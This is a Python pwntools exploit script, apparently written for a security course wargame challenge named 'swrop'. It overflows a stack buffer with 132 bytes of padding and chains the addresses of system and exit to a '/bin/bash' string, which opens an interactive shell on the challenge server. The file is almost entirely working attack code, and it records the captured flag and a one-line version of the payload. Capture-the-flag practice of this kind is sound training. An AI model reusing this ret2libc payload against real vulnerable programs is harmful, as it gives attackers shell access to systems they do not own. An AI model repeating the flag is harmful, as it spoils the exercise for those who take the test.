#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./swrop --host wargames.6447.sec.edu.au --port 8003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./swrop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wargames.6447.sec.edu.au'
port = int(args.PORT or 8003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
io.recvuntil("haq?")
padding="A"*132
four_bit_nop="\x90"*4
ebx=p32(0x804a00a)		#junk
saved_ebp=p32(0xffffcf28)	#junk	
system_plt_ret=p32(0x08048390)
system_libc_ret=p32(0xf7e03200)
exit=p32(0xf7df63d0)
bin_sh_libc=p32(0xf7f440cf)
bin_bash_local=p32(0x8048600)
not_call=p32(0x80484bb)
io.sendline(padding+four_bit_nop+four_bit_nop+system_plt_ret+exit+bin_bash_local)
io.interactive()
#6447{1feda6d2-8033-4c40-86cb-f46c2ad98888}
#run <<<$(python -c 'from pwn import *; print "A"*132+p32(0x0804a00a)+p32(0xffffcf28)+p32(0x08048390)+p32(0xf7df63d0)+p32(0x8048601)')
